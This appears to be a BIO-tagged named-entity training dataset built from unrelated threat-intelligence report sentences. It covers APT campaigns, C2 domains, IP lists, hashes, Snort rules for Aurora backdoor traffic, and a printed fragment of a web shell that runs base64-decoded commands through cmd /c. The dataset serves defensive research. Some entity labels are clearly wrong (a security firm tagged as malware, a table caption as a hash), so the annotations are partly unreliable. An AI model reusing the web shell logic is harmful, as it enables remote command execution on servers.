on	O
defense	O
and	O
geopolitical	O
issues	O
.	O

Two	O
of	O
these	O
(	O
8060.exe	B-malware.unknown
and	O
8555-.exe	B-malware.unknown
)	O
communicate	O
with	O
the	O
same	O
main	O
C	O
&	O
C	O
server	O
rat.pzchao.com	B-url.cncsvr
.	O

Understanding	O
the	O
scope	O
of	O
the	O
newly	O
staged	O
malicious	O
operations	O
,	O
root9B	O
also	O
tipped	O
the	O
information	O
to	O
the	O
appropriate	O
international	O
and	O
domestic	O
government	O
authorities	O
.	O

Checking	O
out	O
the	O
caller	O
function	O
,	O
we	O
see	O
that	O
it	O
operates	O
in	O
a	O
loop	O
.	O

The	O
work	O
of	O
the	O
aforementioned	O
security	O
companies	O
and	O
recent	O
U.S.	O
Department	O
of	O
Justice	O
indictments	O
provides	O
consistent	O
evidence	O
that	O
Iranian	O
government-sponsored	O
offensive	O
campaigns	O
are	O
executed	O
by	O
contractors	O
.	O

We	O
have	O
identified	O
no	O
collaboration	O
between	O
the	O
two	O
actors	O
,	O
or	O
even	O
an	O
awareness	O
of	O
one	O
by	O
the	O
other	O
.	O

contentsOfServer	O
:	O
]	O

In	O
addition	O
to	O
use	O
PowerShell	O
to	O
load	O
the	O
payload	O
,	O
the	O
bait	O
DOC	O
file	O
also	O
runs	O
rundll32.exe	O
to	O
execute	O
another	O
backdoor	O
locally	O
.	O

You	O
do	O
n't	O
run	O
into	O
code	O
like	O
this	O
very	O
often	O
.	O

The	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
threat	O
actors	O
use	O
a	O
Dell	O
laptop	O
and	O
have	O
Skype	O
installed	O
and	O
are	O
setting	O
behind	O
a	O
NAT	O
and	O
their	O
internal	O
IP	O
address	O
is	O
192.168.1.16	B-ip.unknown

Filename	O
:	O
PTL.AYM	O

Location	O
A.	O
represents	O
the	O
dropper	O
program	O
,	O
which	O
unpacks	O
itself	O
and	O
decompresses	O
a	O
fi	O
le	O
to	O
the	O
system32	O
directory	O
.	O

While	O
investigating	O
these	O
cases	O
,	O
Volexity	B-malware.backdoor
also	O
discovered	O
additional	O
APT	O
attack	O
campaigns	O
involving	O
multiple	O
other	O
pro-democratic	O
websites	O
in	O
Hong	O
Kong	O
.	O

For	O
the	O
purposes	O
of	O
testing	O
we	O
used	O
EnCase	O
(	O
v6.19.6	O
)	O
.	O

South	O
Asia	O
is	O
no	O
stranger	O
to	O
deeply	O
rooted	O
conventional	O
conflict	O
which	O
is	O
most	O
often	O
a	O
strong	O
harbinger	O
of	O
cyber	O
conflict	O
.	O

The	O
'	O
US$25k.jar	B-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

We	O
believe	O
at	O
least	O
one	O
of	O
them	O
also	O
understands	O
Chinese	O
.	O

While	O
they	O
change	O
names	O
and	O
house	O
numbers	O
for	O
them	O
,	O
they	O
all	O
reside	O
on	O
Cloverdale	O
Lane	O
in	O
DeSoto	O
,	O
Texas	O
.	O

S	O
P	O
ECIAL	O
REPO	O
RT	O
/	O
JAN	O
UARY	O
2017	O

In	O
all	O
the	O
other	O
cases	O
the	O
samples	O
were	O
already	O
considered	O
malicious	O
.	O

In	O
addition	O
,	O
we	O
also	O
saw	O
an	O
increased	O
use	O
of	O
files	O
that	O
make	O
use	O
of	O
right-to-left	O
override	O
(	O
RTLO	O
)	O
in	O
Unicode	O
.	O

http://vil.nai.com/vil/content/v_253210.htm	B-url.unknown
This	O
Trojan	O
drops	O
further	O
malicious	O
files	O
onto	O
the	O
victim	O
's	O
computer	O
.	O

These	O
attacks	O
cater	O
to	O
the	O
opposition	O
's	O
communication	O
behaviors	O
and	O
tactics	O
.	O

Ch	O
3.00	O
:	O
28dc1ca683d6a14d0d1794a68c477604	B-hash
Ch	O
3.10	O
:	O
b86137fa5a232c614ec5405be4d13b37	B-hash
Code	O
similarity	O
:	O
90	O
%	O
The	O
codes	O
are	O
similar	O
to	O
each	O
other	O
,	O
but	O
the	O
authors	O
added	O
several	O
features	O
:	O
The	O
malware	O
generates	O
more	O
logs	O
;	O
The	O
malware	O
has	O
a	O
Mutex	O
handle	O
;	O
The	O
3.10	O
version	O
supports	O
multiple	O
command	O
and	O
control	O
servers	O
.	O

The	O
situation	O
creates	O
unique	O
trade-offs	O
in	O
Iran	O
's	O
government-sanctioned	O
offensive	O
cyber	O
campaigns	O
;	O
individuals	O
with	O
demonstrated	O
adherence	O
to	O
the	O
government	O
's	O
ideology	O
and	O
individuals	O
with	O
the	O
greatest	O
offensive	O
cyber	O
skills	O
are	O
almost	O
always	O
mutually	O
exclusive	O
.	O

Even	O
better	O
,	O
there	O
is	O
only	O
a	O
single	O
caller	O
of	O
this	O
function	O
.	O

.exe	O
(	O
Six	O
killed	O
and	O
15	O
wounded	O
in	O
an	O
collision	O
between	O
bus	O
and	O
tractor	O
trailer	O
)	O
Intelligence	O
Report	O
:	O
Israel	O
's	O
strategic	O
position	O
has	O
improved.exe	O

Using	O
a	O
web	O
shell	O
as	O
a	O
primary	O
backdoor	O
gives	O
Deep	O
Panda	O
several	O
advantages	O
:	O
Low	O
to	O
virtually	O
no	O
detection	O
by	O
antivirus	O
products	O
The	O
absence	O
of	O
command	O
and	O
control	O
beacon	O
traffic	O
Impossible	O
to	O
block	O
known	O
malicious	O
IP	O
addresses	O
to	O
a	O
web	O
server	O
since	O
adversary	O
can	O
easily	O
change	O
their	O
source	O
IP	O
address	O
Cookie	O
and	O
HTTP	O
header	O
authentication	O
aware	O
web	O
shells	B-malware.backdoor
avoid	O
being	O
enumerated	O
by	O
search	O
engines	O
and	O
restrict	O
access	O
,	O
further	O
reducing	O
their	O
network	O
footprint	O
To	O
assist	O
organizations	O
with	O
identifying	O
web	O
shells	B-malware.backdoor
in	O
their	O
environment	O
,	O
this	O
post	O
will	O
cover	O
two	O
popular	O
Deep	O
Panda	O
web	O
shells	B-malware.backdoor
.	O

Malicious	O
Edge	O
and	O
Chrome	O
Extension	O
Used	O
to	O
Deliver	O
Backdoor	O
GPON	O
Vulnerabilities	O
Exploited	O
for	O
Mexico-based	O
Mirai-like	B-malware.backdoor
Scanning	O
Activities	O
Confucius	O
Update	O
:	O
New	O
Tools	O
and	O
Techniques	O
,	O
Further	O
Connections	O
with	O
Patchwork	O
Legitimate	O
Application	O
AnyDesk	O
Bundled	O
with	O
New	O
Ransomware	O
Variant	O
Malicious	O
Traffic	O
in	O
Port	O
7001	O
Surges	O
as	O
Cryptominers	O
Target	O
Patched	O
2017	O
Oracle	O
WebLogic	O
Vulnerability	O

Figure	O
17	O
:	O

140.116.70.8	B-ip.unknown
143.89.35.7	B-ip.unknown
143.89.35.7	B-ip.unknown
150.176.164.6	B-ip.unknown
202.105.39.39	B-ip.unknown
202.39.61.136	B-ip.unknown
202.6.235.83	B-ip.unknown
203.200.205.245	B-ip.unknown
204.111.73.150	B-ip.unknown
209.124.51.194	B-ip.unknown
209.124.51.219	B-ip.unknown
209.161.249.125	B-ip.unknown
209.208.114.83	B-ip.unknown
209.233.16.84	B-ip.unknown
209.253.17.229	B-ip.unknown
211.232.57.235	B-ip.unknown
212.130.19.154	B-ip.unknown
218.232.66.12	B-ip.unknown
218.233.206.2	B-ip.unknown
218.234.17.30	B-ip.unknown
24.73.192.154	B-ip.unknown
46.149.18.151	B-ip.unknown
60.248.52.95	B-ip.unknown
61.219.67.1	B-ip.unknown
63.192.38.11	B-ip.unknown
64.80.153.108	B-ip.unknown
65.105.157.228	B-ip.unknown
65.110.1.32	B-ip.unknown
65.114.195.226	B-ip.unknown
65.89.173.68	B-ip.unknown
66.151.16.30	B-ip.unknown
66.155.114.145	B-ip.unknown
66.170.3.43	B-ip.unknown
66.228.132.53	B-ip.unknown
66.228.132.8	B-ip.unknown
68.17.104.162	B-ip.unknown
68.96.31.136	B-ip.unknown
69.20.5.219	B-ip.unknown
69.25.50.10	B-ip.unknown
69.28.168.10	B-ip.unknown
69.74.43.87	B-ip.unknown
69.90.123.6	B-ip.unknown
69.90.18.22	B-ip.unknown
69.90.18.23	B-ip.unknown
70.108.241.36	B-ip.unknown
70.62.232.98	B-ip.unknown
74.86.197.56	B-ip.unknown
74.93.92.50	B-ip.unknown
78.95.63.1	B-ip.unknown
File	O
based	O
indications	O
of	O
possible	O
compromise	O
by	O
the	O
comment	O
crew	O
attackers	O
.	O

后台技术	O
(	O
7	O
)	O

Scrambling	O
'	O
Mac	O
OSX	O
10.12	O
'	O

Other	O
works	O
of	O
hers	O
on	O
a	O
similar	O
note	O
include	O
'	O
India	O
's	O
Silence	O
on	O
Chinese	O
Incursions	O
'	O
and	O
'	O
China	O
and	O
Pakistan	O
:	O
Dangerous	O
Liaisons	O
.	O
'	O

'	O
Reflective	O
DLL	O
injection	O
is	O
a	O
library	O
injection	O
technique	O
in	O
which	O
the	O
concept	O
of	O
reflective	O
programming	O
is	O
employed	O
to	O
perform	O
the	O
loading	O
of	O
a	O
library	O
from	O
memory	O
into	O
a	O
host	O
process	O
'	O
.	O

This	O
seems	O
odd	O
,	O
considering	O
RATs	B-malware.backdoor
require	O
manual	O
labor	O
as	O
opposed	O
to	O
automated	B-malware.infosteal
banking	I-malware.infosteal
Trojans	I-malware.infosteal
.	O

Category	O
Pre-touch	O
Match	O
Post-touch	O
Match	O

We	O
have	O
observed	O
the	O
DragonOK	B-malware.infosteal
group	O
target	O
high-technology	O
and	O
manufacturing	O
companies	O
in	O
both	O
Japan	O
and	O
Taiwan	O
.	O

Please	O
refer	O
to	O
Appendix	O
A	O
for	O
conditions	O
which	O
Asruex	O
detects	O
a	O
virtual	O
machine	O
.	O

Trojan.Dustky	O

The	O
infection	O
was	O
in	O
the	O
form	O
of	O
a	O
renamed	O
netui3.dll	B-malware.backdoor
or	O
winmgt.dll	B-malware.backdoor
file	O
along	O
with	O
an	O
Autorun.inf	B-malware.backdoor
file	O
set	O
to	O
run	O
the	O
renamed	O
netui3.dll/winmgt.dll	B-malware.backdoor
when	O
the	O
infected	O
drive	O
was	O
connected	O
to	O
a	O
target	O
host	O
.	O

These	O
logs	O
feature	O
a	O
range	O
of	O
subnets	O
,	O
mainly	O
located	O
in	O
Asia	O
.	O

Values	O
found	O
in	O
Windows	O
'	O
Registry	O
:	O
the	O
VBS	O
scripts	O
are	O
executed	O
by	O
Windows	O
'	O
Wscript	O
at	O
startup	O
:	O
The	O
.vbs	O
scripts	O
as	O
well	O
as	O
the	O
.txt	O
files	O
contain	O
the	O
loader	O
's	O
script	O
,	O
which	O
launches	O
PowerShell	O
with	O
a	O
base64	O
encoded	O
command	O
,	O
which	O
either	O
loads	O
another	O
PowerShell	O
script	O
(	O
e.g	O
Cobalt	O
Strike	O
Beacon	O
)	O
or	O
fetches	O
a	O
payload	O
from	O
the	O
command-and-control	O
(	O
C	O
&	O
C	O
)	O
server	O
:	O

However	O
,	O
we	O
did	O
manage	O
to	O
identify	O
victims	O
that	O
are	O
likely	O
employees	O
of	O
three	O
web	O
software	O
development	O
companies	O
in	O
India	O
and	O
one	O
in	O
South	O
Korea	O
.	O

DBC_BANK_IMG_23456_156.jar	B-malware.infosteal

The	O
tools	O
targeted	O
by	O
this	O
group	O
enable	O
practices	O
for	O
securing	O
secrecy	O
and	O
integrity	O
of	O
data	O
.	O

This	O
is	O
purely	O
an	O
example	O
of	O
how	O
the	O
initial	O
object	O
can	O
be	O
included	O
.	O

In	O
general	O
,	O
this	O
contributes	O
to	O
the	O
Philippines	O
continuing	O
to	O
be	O
a	O
target	O
for	O
cybercrime/cyberespionage	O
or	O
even	O
state-sponsored	O
attacks	O
.	O

Shortly	O
after	O
that	O
different	O
users	O
in	O
the	O
country	O
started	O
being	O
redirected	O
to	O
the	O
malicious	O
domain	O
update.iaacstudio[.]com	O
as	O
a	O
result	O
of	O
the	O
waterholing	O
of	O
government	O
websites	O
.	O

It	O
's	O
capabilities	O
support	O
quite	O
an	O
extensive	O
laundry	O
list	O
of	O
mischief	O
,	O
including	O
but	O
not	O
limited	O
to	O
key	O
logging	O
,	O
web	O
cam	O
(	O
and	O
sound	O
card	O
)	O
spying	O
,	O
deleting	O
victim	O
files	O
,	O
scanning	O
ports	O
,	O
hijacking	O
MSN	O
sessions	O
,	O
etc	O
.	O

With	O
approximately	O
425,000	O
people	O
serving	O
clients	O
in	O
more	O
than	O
120	O
countries	O
,	O
Accenture	O
drives	O
innovation	O
to	O
improve	O
the	O
way	O
the	O
world	O
works	O
and	O
lives	O
.	O

The	O
most	O
likely	O
attack	O
vector	O
is	O
social	O
engineering	O
via	O
phishing	O
emails	O
,	O
USB	O
sticks	O
,	O
and	O
other	O
techniques	O
.	O

The	O
payload	O
section	O
can	O
have	O
up	O
to	O
three	O
different	O
presentations	O
depending	O
on	O
if	O
compression	O
is	O
used	O
.	O

The	O
problem	O
with	O
reverse	O
engineering	O
this	O
sample	O
starts	O
from	O
the	O
fact	O
that	O
it	O
has	O
more	O
than	O
2,000	O
functions	O
and	O
most	O
of	O
them	O
are	O
statically	O
linked	O
to	O
OpenSSL	O
code	O
without	O
symbols	O
.	O

From	O
the	O
emails	O
(	O
and	O
the	O
attachments	O
)	O
it	O
looks	O
like	O
the	O
goal	O
of	O
the	O
attackers	O
was	O
to	O
infect	O
and	O
take	O
control	O
of	O
the	O
systems	O
and	O
to	O
spy	O
on	O
the	O
victims	O
.	O

In	O
March	O
2017	O
,	O
Wikileaks	O
published	O
details	O
about	O
an	O
exploit	O
affecting	O
Mikrotik	O
called	O
ChimayRed	O
.	O

Table	O
A-6	O
:	O
The	O
disk	O
name	O
contains	O
the	O
listed	O
strings	O
.	O

The	O
application	O
searches	O
again	O
for	O
another	O
string	O
delimiter	O
AAAAAAA	O
.	O

When	O
the	O
malicious	O
shortcut	O
file	O
is	O
opened	O
,	O
the	O
following	O
PowerShell	O
command	O
in	O
the	O
file	O
is	O
executed	O
.	O

CrowdStrike	O
Intelligence	O
has	O
assessed	O
that	O
the	O
distribution	O
of	O
the	O
malicious	O
application	O
targeted	O
the	O
very	O
artillery	O
units	O
for	O
which	O
the	O
benign	O
application	O
was	O
developed—brigades	O
operating	O
in	O
eastern	O
Ukraine	O
on	O
the	O
frontlines	O
of	O
the	O
conflict	O
with	O
Russian-backed	O
separatist	O
forces	O
during	O
the	O
early	O
stages	O
of	O
the	O
conflict	O
in	O
late-2014	O
.	O

Figure	O
19	O
shows	O
it	O
running	O
on	O
Linux	O
with	O
PHP	O
.	O

getFileFromDirectory	O
:	O
sizeFile	O
:	O
]	O

The	O
same	O
functions	O
are	O
used	O
in	O
Duqu	B-malware.infosteal
drivers	O
,	O
while	O
the	O
list	O
of	O
functions	O
'	O
hashes	O
is	O
twice	O
as	O
long	O
.	O

And	O
,	O
as	O
Python	O
is	O
a	O
human-readable	O
format	O
,	O
this	O
makes	O
analysis	O
straightforward	O
:	O

EADING	O
FILES	O
AND	O
SAMPLE	O
DOWNLOADING	O
......................................................................................................	O
1	O

Minor	O
changes	O
and	O
updates	O
to	O
the	O
code	O
were	O
released	O
with	O
these	O
deployments	O
,	O
including	O
a	O
new	O
mutex	O
format	O
and	O
the	O
exclusive	O
use	O
of	O
encrypted	O
HTTP	O
communications	O
over	O
TLS	O
.	O

.	O

page	O
|	O
10	O

Other	O
domains	O
owned	O
by	O
this	O
entity	O
are	O
necessaries-documentation[.]com	B-url.unknown
and	O
accountsloginmail-process[.]com	B-url.unknown
which	O
show	O
pDNS	O
overlap	O
with	O
the	O
previously	O
mentioned	O
malicious	O
domains	O
.	O

The	O
file	O
was	O
rtniczw.sys	O
,	O
26,872	O
bytes	O
in	O
size	O
,	O
MD5	O
546C4BBEBF02A1604EB2CAAAD4974DE0	O
.	O

DarkComet	B-malware.backdoor
iterates	O
through	O
its	O
decryption	O
loop	O
once	O
for	O
each	O
byte	O
in	O
the	O
encrypted	O
source	O
message	O
(	O
after	O
conversion	O
from	O
ASCII	O
to	O
integer	O
representation	O
.	O
)	O

One	O
notable	O
difference	O
in	O
the	O
analyzed	O
samples	O
is	O
that	O
they	O
do	O
not	O
directly	O
download	O
the	O
Visual	O
Basic	O
Script	O
(	O
VBS	O
)	O
and	O
PowerShell	O
component	O
files	O
,	O
and	O
instead	O
encode	O
all	O
the	O
scripts	O
on	O
the	O
document	O
itself	O
.	O

This	O
'	O
eraser	O
'	O
application	O
is	O
dropped	O
as	O
%	O
temp	O
%	O
\	O
[	O
0-9	O
]	O
.tmp.exe	O
.	O

Search	O

dataset	O
.	O

Exploitation	O
of	O
Link	O
Auto	O
Update	O

The	O
use	O
of	O
the	O
steganography	O
tool	O
shows	O
how	O
quickly	O
the	O
adversary	O
has	O
adapted	O
to	O
new	O
tools	O
.	O

T	O
he	O
attackers	O
checked	O
the	O
smbtrap	O
log	O
file	O
on	O
working	O
days	O
.	O

C	O
&	O
C	O
Servers	O
http://23.227.196.215	B-ip.unknown
http://apple-iclods.org	B-url.cncsvr
http://apple-checker.org	B-url.cncsvr
http://apple-uptoday.org	B-url.cncsvr
http://apple-search.infoThe	B-url.cncsvr
command	O
structure	O
,	O
called	O
cmdPacket	O
,	O
contains	O
a	O
command	O
identifier	O
,	O
a	O
command	O
parameter	O
and	O
a	O
size	O
for	O
the	O
parameter	O
.	O

unsigned	O
char	O
cmd	O
;	O

Changes	O
in	O
the	O
second	O
stage	O
SPLM	B-malware.backdoor
backdoor	O
are	O
refined	O
,	O
making	O
the	O
code	O
reliably	O
modular	O
.	O

The	O
suspect	O
communication	O
allows	O
us	O
to	O
detect	O
the	O
traffic	O
.	O

Before	O
communicating	O
with	O
its	O
command	O
and	O
control	O
(	O
C	O
&	O
C	O
)	O
,	O
the	O
malware	O
saves	O
a	O
ServerID	O
in	O
the	O
registry	O
with	O
a	O
randomly	O
generated	O
value	O
.	O

Please	O
contact	O
us	O
at	O
:	O
deceptionproject(at)Cylance[.]com	O
.	O

Email	O
Subscription	O
Your	O
email	O
here	O

McAfee	O
Web	O
Gateway.TrustedSource	O
has	O
coverage	O
for	O
domains	O
and	O
IP	O
addresses	O
that	O
the	O
malware	O
contacts	O
.	O

The	O
extent	O
of	O
the	O
wiping	O
appeared	O
to	O
be	O
on	O
the	O
same	O
level	O
to	O
what	O
was	O
found	O
on	O
single	O
partitioned	O
drives	O
.	O

The	O
most	O
common	O
way	O
this	O
malware	O
packaged	O
is	O
via	O
a	O
self­extracting	O
RAR	O
file	O
;	O
however	O
the	O
attackers	O
also	O
appear	O
to	O
have	O
used	O
a	O
number	O
of	O
other	O
solutions	O
to	O
drop	O
their	O
malware	O
,	O
including	O
a	O
Visual	O
Basic	O
based	O
wrapper	O
and	O
an	O
Auto­IT	O
based	O
wrapper	O
.	O

This	O
would	O
install	O
three	O
 les	O
on	O
the	O
computer	O
,	O
an	O
information	O
stealer	O
,	O
a	O
screen	O
capture	O
utility	O
,	O
and	O
an	O
empty	O
executable	O
.	O

Since	O
2014	O
,	O
APT28	B-malware.infosteal
network	O
activity	O
has	O
likely	O
supported	O
information	O
operations	O
designed	O
to	O
influence	O
the	O
domestic	O
politics	O
of	O
foreign	O
nations	O
.	O

PrayTime	O
is	O
used	O
to	O
give	O
the	O
user	O
a	O
notification	O
when	O
it	O
's	O
time	O
to	O
pray	O
.	O

This	O
maliciously	O
crafted	O
script	O
attempts	O
to	O
exploit	O
the	O
vulnerability	O
when	O
Internet	O
Explorer	O
handles	O
certain	O
DOM	O
operations	O
.	O

Figure	O
2	O
.	O

Once	O
machines	O
are	O
detected	O
,	O
the	O
user	O
is	O
encouraged	O
to	O
use	O
the	O
freely	O
available	O
inoculation	O
shot	O
to	O
remove	O
the	O
infection	O
.	O

HBGary	O
is	O
currently	O
tracking	O
several	O
groups	O
who	O
operate	O
malware	O
systems	O
of	O
this	O
nature	O
.	O

JAVASCRIPT	O
EXPLOIT	O
CODE	O

BOOL	O
WINAPI	O
GetVersionEx	O
(	O
_Inout_	O
LPOSVERSIONINFO	O
lpVersionInfo	O
typedef	O
struct	O
_OSVERSIONINFO	O
{	O
DWORD	O
dwOSVersionInfoSize	O
;	O
DWORD	O
dwMajorVersion	O
;	O
DWORD	O
dwMinorVersion	O
;	O
DWORD	O
dwBuildNumber	O
;	O
DWORD	O
dwPlatformId	O
;	O
TCHAR	O
szCSDVersion	O
[	O
128	O
]	O
;	O
}	O
OSVERSIONINFO	O
;	O

where	O
<	O
service	O
name	O
>	O
is	O
the	O
chosen	O
infected	O
service	O
name	O
.	O

Hello	O
,	O
I	O
cordially	O
invite	O
you	O
to	O
our	O
anniversary	O
It	O
is	O
a	O
celebration	O
of	O
life	O
and	O
love	O
.	O

In	O
addition	O
,	O
strings	O
found	O
in	O
the	O
dropper	O
include	O
the	O
word	O
'	O
payload	O
'	O
,	O
which	O
is	O
commonly	O
associated	O
with	O
malware	O
.	O

This	O
ID	O
identifies	O
this	O
bot	O
in	O
the	O
botnet	O
.	O

In	O
this	O
blog	O
,	O
we	O
'll	O
be	O
using	O
sample	O
SHA1	O
:	O
dc3ab3f6af87405d889b6af2557c835d7b7ed588	B-hash
in	O
our	O
examples	O
and	O
analysis	O
.	O

There	O
were	O
a	O
number	O
of	O
projects	O
involving	O
programs	O
based	O
on	O
the	O
'	O
Tilded	O
'	O
platform	O
throughout	O
the	O
period	O
2007-2011	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

At	O
the	O
time	O
of	O
the	O
attack	O
,	O
there	O
were	O
n't	O
many	O
classic	O
indicators	O
of	O
compromise	O
(	O
IOCs	O
)	O
that	O
could	O
lead	O
to	O
attribution	O
.	O

In	O
2011	O
,	O
the	O
IRGC	O
's	O
ICA	O
formed	O
the	O
foundation	O
of	O
the	O
Khaybar	O
Center	O
for	O
Information	O
Technology	O
.	O

http://web.archive[.]org/web/20170203175640/	B-url.unknown
https://sap.misapor.ch/Default.html	I-url.unknown
http://web.archive[.]org/web/20170203175641/	B-url.unknown
https://sap.misapor.ch/Silverlight.js	I-url.unknown
Default.html	O
contains	O
code	O
to	O
load	O
MisaporPortalUI.xap	O
–	O
a	O
Silverlight	O
application	O
which	O
likely	O
would	O
contain	O
the	O
malicious	O
first-stage	O
implant	O
.	O

Once	O
it	O
infects	O
the	O
host	O
,	O
it	O
can	O
download	O
and	O
run	O
the	O
next	O
APT28/Sofacy	O
component	O
,	O
which	O
-	O
to	O
the	O
best	O
of	O
our	O
knowledge	O
-	O
is	O
the	O
XAgent	B-malware.backdoor
malware	O
that	O
forms	O
the	O
object	O
of	O
this	O
paper	O
.	O

info@minerva-labs.com	O
http://www.minerva-labs.com	B-url.normal

In	O
order	O
to	O
evade	O
static	O
virus	O
scanners	O
in	O
new	O
version	O
of	O
the	O
RAT	B-malware.backdoor
,	O
the	O
attackers	O
obfuscated	O
the	O
names	O
of	O
the	O
API	O
functions	O
.	O

The	O
implants	O
are	O
downloaded	O
via	O
a	O
Flash	O
file	O
embedded	O
in	O
the	O
malicious	O
document	O
.	O

The	O
author	O
leaked	O
information	O
within	O
the	O
samples	O
(	O
i.e.	O
Adeel	O
)	O
and	O
on	O
the	O
VirusTotal	O
platform	O
.	O

The	O
log	O
files	O
we	O
identified	O
contain	O
the	O
phone	O
number	O
of	O
the	O
device	O
.	O

The	O
nature	O
of	O
the	O
records	O
depends	O
on	O
the	O
particular	O
module	O
and	O
submodule	O
.	O

Open-source	O
reporting	O
indicates	O
losses	O
of	O
almost	O
50	O
%	O
of	O
equipment	O
in	O
the	O
last	O
2	O
years	O
of	O
conflict	O
amongst	O
Ukrainian	O
artillery	O
forces	O
and	O
over	O
80	O
%	O
of	O
D-30	O
howitzers	O
were	O
lost	O
,	O
far	O
more	O
than	O
any	O
other	O
piece	O
of	O
Ukrainian	O
artillery	O
9	O
.	O

The	O
user	O
list	O
,	O
chat	O
room	O
names	O
,	O
and	O
content	O
of	O
the	O
applications	O
were	O
stored	O
in	O
a	O
remote	O
server	O
without	O
any	O
authentication	O
.	O

It	O
should	O
be	O
noted	O
that	O
we	O
did	O
not	O
find	O
a	O
Stuxnet	B-malware.backdoor
infection	O
on	O
the	O
system	O
:	O
no	O
additional	O
files	O
from	O
the	O
Stuxnet	B-malware.backdoor
kit	O
had	O
been	O
found	O
.	O

We	O
also	O
discovered	O
several	O
files	O
which	O
were	O
presumably	O
uploaded	O
from	O
other	O
victims	O
'	O
computers	O
(	O
Fig	O
12	O
)	O
.	O

Table	B-hash
3	I-hash
:	O
File	O
MD5	O
Hashes	O
and	O
Compile	O
Times	O
FireEye	O
detects	O
IRONGATE	B-malware.backdoor
.	O

The	O
attacker	O
spoofed	O
the	O
message	O
to	O
appear	O
to	O
be	O
from	O
info@nctc.go.kr	O
,	O
which	O
is	O
the	O
National	O
Counter-Terrorism	O
Center	O
(	O
NCTC	O
)	O
in	O
South	O
Korea	O
.	O

Our	O
analysis	O
of	O
this	O
malware	O
shows	O
that	O
it	O
belongs	O
to	O
Hussarini	B-malware.backdoor
,	O
also	O
known	O
as	O
Sarhust	O
,	O
a	O
backdoor	O
family	O
that	O
has	O
been	O
used	O
actively	O
in	O
APT	O
attacks	O
targeting	O
countries	O
in	O
the	O
ASEAN	O
region	O
since	O
2014	O
.	O

This	O
data	O
is	O
also	O
sent	O
,	O
but	O
RSA	O
encrypted	O
.	O

Where	O
support	O
is	O
needed	O
,	O
Accenture	O
Security	O
can	O
provide	O
resources	O
designed	O
to	O
mitigate	O
risks	O
and	O
remediate	O
gaps	O
in	O
ICS	O
security	O
programs	O
.	O

In	O
the	O
exploit	O
used	O
by	O
the	O
ScarCruft	B-malware.infosteal
group	O
,	O
we	O
have	O
the	O
following	O
item_info	O
structures	O
:	O

et	O
al	O
.	O

Again	O
,	O
the	O
less-interesting	O
Double	O
XOR	O
routine	O
appears	O
to	O
be	O
used	O
to	O
obfuscate	O
the	O
C2	O
domain	O
with	O
the	O
single-byte	O
keys	O
0x70	O
and	O
0x79	O
.	O

install.exe	O
www.searchhappynews[.]com	B-url.cncsvr
|	O
Port	O
80	O
Static	O
|	O
XYTvn	O

Phone	O
:	O
+1-855-292-3937	O
Email	O
:	O
cywatch@ic.fbi.gov	O
NCCIC	O
continuously	O
strives	O
to	O
improve	O
its	O
products	O
and	O
services	O
.	O

Please	O
note	O
that	O
the	O
sender	O
shall	O
not	O
be	O
liable	O
for	O
the	O
improper	O
<	O
BR=	O
this	O
communication	O
,	O
nor	O
for	O
any	O
delay	O
in	O
its	O
receipt	O
or	O
damage	O
to	O
your	O
system	O
.	O

스피어피싱	O
(	O
Spear	O
Phishing	B-malware.drop
)	O
..................................................................................................................................	O
4	O
2	O
.	O

Figure	O
1	O
.	O

It	O
is	O
unlikely	O
the	O
attackers	O
will	O
change	O
the	O
encryption	O
setup	O
,	O
however	O
.	O

Reports	O
emerged	O
just	O
over	O
a	O
week	O
ago	O
of	O
a	O
new	O
cyber-enabled	O
bank	O
heist	O
in	O
Asia	O
.	O

alert	O
tcp	O
$	O
HOME_NET	O
any	O
-	O
>	O
$	O
EXTERNAL_NET	O
443	O
(	O
msg	O
:	O
'	O
ET	O
TROJAN	O
Aurora	B-malware.backdoor
Backdoor	I-malware.backdoor
(	O
C	O
&	O
C	O
)	O
client	O
connection	O
to	O
CnC	O
'	O
;	O
fl	O
ow	O
:	O
established	O
,	O
to_	O
server	O
;	O
content	O
:	O
'	O
|	O
ff	O
ff	O
ff	O
ff	O
ff	O
ff	O
00	O
00	O
fe	O
ff	O
ff	O
ff	O
ff	O
ff	O
ff	O
ff	O
ff	O
ff	O
88	O
ff	O
|	O
'	O
;	O
depth:20	O
;	O
fl	O
owbits:set,ET.aurora.init	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,www.trustedsource.org/blog/373/An-Insight-into-the-Aurora-Communication-Protocol	O
;	O
reference:url,doc.emergingthreats.net/2010695	O
;	O
reference:url,www.emergingthreats.net/cgi-bin/cvsweb.cgi/sigs/VIRUS/TROJAN_Aurora	O
;	O
sid:2010695	O
;	O
rev:2	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
443	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg	O
:	O
'	O
ET	O
TROJAN	O
Aurora	B-malware.backdoor
Backdoor	I-malware.backdoor
(	O
C	O
&	O
C	O
)	O
connection	O
CnC	O
response	O
'	O
;	O
fl	O
owbits	O
:	O
isset	O
,	O
ET	O
.	O

GetString	O
(	O
System.Convert.FromBase64String	O
(	O
Request.Item	O
[	O
'	O
z1	O
'	O
]	O
)	O
)	O
)	O
;	O
vare=newSystem.Diagnostics.Process	O
(	O
)	O
;	O
varout:System.IO.StreamReader,EI:System.IO.StreamReader	O
;	O
c.	O
UseShellExecute=false	O
;	O
c.RedirectStandardOutput=true;c.RedirectStandardError=true	O
;	O
e.StartInfo=c;c.Arguments='/c'+System.Text.Encoding.GetEncoding	O
(	O
65001	O
)	O
.	O

Its	O
persistence	O
,	O
stealth	O
,	O
and	O
global	O
reach	O
mean	O
the	O
group	O
continues	O
to	O
pose	O
an	O
ongoing	O
risk	O
to	O
organizations	O
,	O
particularly	O
in	O
its	O
areas	O
of	O
interest	O
,	O
which	O
include	O
defense	O
,	O
aerospace	O
,	O
energy	O
,	O
governments	O
,	O
telecoms	O
,	O
media	O
,	O
and	O
 nance	O
.	O

The	O
flyer	O
explains	O
that	O
the	O
botnet	B-malware.ransom
wo	O
n't	O
work	O
in	O
a	O
virtual	O
machine	O
.	O

Malware	O
generates	O
the	O
user	O
name	O
to	O
communicate	O
with	O
the	O
C2	O
by	O
concatenating	O
a	O
)	O
the	O
machine	O
name	O
,	O
b	O
)	O
a	O
random	O
number	O
between	O
1000	O
to	O
9999	O
and	O
c	O
)	O
the	O
product	O
version	O
of	O
the	O
file	O
.	O

